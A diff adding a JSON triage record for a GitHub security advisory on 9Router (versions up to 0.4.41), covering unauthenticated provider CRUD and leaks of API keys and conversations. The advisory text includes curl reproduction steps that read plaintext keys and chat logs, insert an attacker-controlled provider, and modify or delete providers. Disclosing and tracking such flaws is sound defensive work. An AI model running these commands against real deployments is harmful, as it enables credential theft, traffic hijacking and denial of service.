@@ -1,0 +1,55 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/88440500?v=4\", \"events_url\": \"https://api.github.com/users/newnol/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/newnol/followers\", \"following_url\": \"https://api.github.com/users/newnol/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/newnol/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/newnol\", \"id\": 88440500, \"login\": \"newnol\", \"node_id\": \"MDQ6VXNlcjg4NDQwNTAw\", \"organizations_url\": \"https://api.github.com/users/newnol/orgs\", \"received_events_url\": \"https://api.github.com/users/newnol/received_events\", \"repos_url\": \"https://api.github.com/users/newnol/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/newnol/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/newnol/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/newnol\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": 10.0, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 10.0, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-200\", \"name\": \"Exposure of Sensitive Information to an Unauthorized Actor\"}, {\"cwe_id\": \"CWE-306\", \"name\": \"Missing Authentication for Critical Function\"}, {\"cwe_id\": \"CWE-862\", \"name\": \"Missing Authorization\"}], \"description\": \"---\\ntitle: Unauthenticated CRUD on /api/providers and Full API Key Leak via /api/usage/stats\\nproduct: 9Router\\nversion: <= 0.4.41\\nseverity: critical\\ncve_request: true\\n---\\n\\n## Summary\\n\\nMultiple critical API security vulnerabilities were discovered in 9Router's Next.js dashboard. The `/api/providers` endpoints lack authentication entirely, allowing anyone to create, read, update, and delete provider connections. Additionally, `/api/usage/stats` exposes full plaintext API keys, and `/api/usage/request-logs` + `/api/usage/request-details` expose all users' request history and full conversation contents (including system prompts, user messages, assistant responses) without authentication.\\n\\n## Affected Endpoints\\n\\n| Endpoint | Method | Issue |\\n|---|---|---|\\n| `/api/providers` | GET | Lists all provider connections with partial credentials, OAuth tokens, account IDs |\\n| `/api/providers/:id` | GET | Read any single provider detail (IDOR) |\\n| `/api/providers` | POST | Create arbitrary provider connections with attacker-controlled API keys |\\n| `/api/providers/:id` | PUT | Modify any existing provider connection |\\n| `/api/providers/:id` | DELETE | Delete any provider connection |\\n| `/api/usage/stats` | GET | Exposes full plaintext API keys, per-account usage breakdown, cost data |\\n| `/api/usage/request-logs` | GET | Exposes all users' request logs (model, tokens, cost, timestamp, provider) |\\n| `/api/usage/request-details/:id` | GET | Exposes full conversation turns including system prompts, user messages, assistant responses |\\n| `/api/version` | GET | Exposes current version info |\\n| `/api/models` | GET | Exposes full model routing catalog |\\n| `/api/v1/models` | GET | Exposes model list |\\n\\n## Impact\\n\\n### Critical: Provider CRUD without authentication\\n\\nAn attacker can:\\n1. **Add a malicious provider** — inject a provider that proxies through their server, capturing all prompts, responses, and API keys routed through 9Router\\n2. **Modify existing providers** — replace API keys with attacker-controlled ones, redirect traffic\\n3. **Delete all providers** — cause complete denial of service\\n4. **Read all provider configurations** — harvest partial credentials, GitHub Copilot OAuth tokens, Cloudflare account IDs, email addresses\\n\\n### Critical: Full API key leak via /api/usage/stats\\n\\nThe endpoint returns complete API key strings (e.g., `sk-...`) in plaintext alongside usage data per key, enabling unauthorized use of connected AI provider accounts.\\n\\n### Critical: Conversation history leak\\n\\n`/api/usage/request-details` returns the full conversation history of other users' AI sessions, including system prompts, user messages, assistant responses, tool calls, and reasoning traces.\\n\\n## Steps to Reproduce\\n\\n### 1. Unauthenticated read of all providers\\n\\n```bash\\ncurl -s https://<host>/api/providers\\n```\\n\\nReturns all provider connections with email addresses, auth type, account IDs, and partial API key prefixes.\\n\\n### 2. Create a provider without authentication\\n\\n```bash\\ncurl -X POST https://<host>/api/providers \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"provider\\\":\\\"openai\\\",\\\"authType\\\":\\\"apikey\\\",\\\"name\\\":\\\"rogue\\\",\\\"apiKey\\\":\\\"sk-attacker-controlled\\\"}'\\n```\\n\\nReturns the created connection object with a new UUID and `isActive: true`.\\n\\n### 3. Modify an existing provider without authentication\\n\\n```bash\\ncurl -X PUT https://<host>/api/providers/<existing-uuid> \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"name\\\":\\\"modified\\\",\\\"apiKey\\\":\\\"sk-attacker-key\\\"}'\\n```\\n\\nReturns the updated connection object.\\n\\n### 4. Delete a provider without authentication\\n\\n```bash\\ncurl -X DELETE https://<host>/api/providers/<existing-uuid>\\n```\\n\\nReturns `{\\\"message\\\":\\\"Connection deleted successfully\\\"}`.\\n\\n### 5. Read full usage stats with API keys\\n\\n```bash\\ncurl -s https://<host>/api/usage/stats\\n```\\n\\nReturns full API key strings, per-account token/cost breakdown, recent requests.\\n\\n### 6. Read request logs\\n\\n```bash\\ncurl -s \\\"https://<host>/api/usage/request-logs?page=1&pageSize=50\\\"\\n```\\n\\nReturns paginated request logs with timestamps, models, providers, user emails, token counts.\\n\\n### 7. Read full conversation\\n\\n```bash\\ncurl -s https://<host>/api/usage/request-details/<request-uuid>\\n```\\n\\nReturns complete conversation turns for that request.\\n\\n### 8. Read version info\\n\\n```bash\\ncurl -s https://<host>/api/version\\n```\\n\\nReturns `{\\\"currentVersion\\\":\\\"0.4.19\\\",\\\"latestVersion\\\":\\\"0.4.45\\\",\\\"hasUpdate\\\":true}`.\\n\\n## Root Cause\\n\\nThe Next.js API routes under `src/app/api/*` lack authentication middleware on several endpoints. Specifically:\\n\\n- `/api/providers/*` — No auth check before CRUD operations on provider connections stored in the database\\n- `/api/usage/stats` — No auth check before returning aggregated usage data including full API keys\\n- `/api/usage/request-logs` — No auth check before returning request history\\n- `/api/usage/request-details/:id` — No auth check before returning full conversation contents\\n\\n## Suggested Fix\\n\\n1. Add authentication middleware to all `/api/providers/*` routes (GET, POST, PUT, DELETE)\\n2. Add authentication middleware to all `/api/usage/*` routes\\n3. Never return full API key strings in any API response — return masked keys only\\n4. Never return GitHub Copilot tokens or similar OAuth secrets in API responses\\n5. Implement proper authorization checks so users can only access their own data\\n6. Add rate limiting to public endpoints\\n\\n## Resources\\n\\n- https://github.com/decolua/9router\", \"ghsa_id\": \"GHSA-vjc7-jrh9-9j86\", \"github_reviewed_at\": \"2026-07-06T21:22:10Z\", \"html_url\": \"https://github.com/advisories/GHSA-vjc7-jrh9-9j86\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-vjc7-jrh9-9j86\"}], \"nvd_published_at\": null, \"published_at\": \"2026-07-06T21:22:10Z\", \"references\": [\"https://github.com/decolua/9router/security/advisories/GHSA-vjc7-jrh9-9j86\", \"https://github.com/advisories/GHSA-vjc7-jrh9-9j86\"], \"repository_advisory_url\": \"https://api.github.com/repos/decolua/9router/security-advisories/GHSA-vjc7-jrh9-9j86\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/decolua/9router\", \"summary\": \"9router has unauthenticated CRUD on /api/providers and Full API Key Leak via /api/usage/stats\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-06T21:22:11Z\", \"url\": \"https://api.github.com/advisories/GHSA-vjc7-jrh9-9j86\", \"vulnerabilities\": [{\"first_patched_version\": null, \"package\": {\"ecosystem\": \"npm\", \"name\": \"9router\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.4.41\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-vjc7-jrh9-9j86",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "9router: <= 0.4.41"
+    ],
+    "authentication_required": false,
+    "cves": [],
+    "cvss_score": 10.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "9router"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-20T19:51:55.845679Z",
+  "provenance": {
+    "content_sha256": "4d26d2095018ce50d3e228ea490de068d473eb6942fc93548eb7dd5c492bf03f",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-06T21:22:10Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-vjc7-jrh9-9j86",
+  "status": "active",
+  "title": "9router has unauthenticated CRUD on /api/providers and Full API Key Leak via /api/usage/stats",
+  "updated_at": "2026-07-06T21:22:11Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-vjc7-jrh9-9j86"
+}
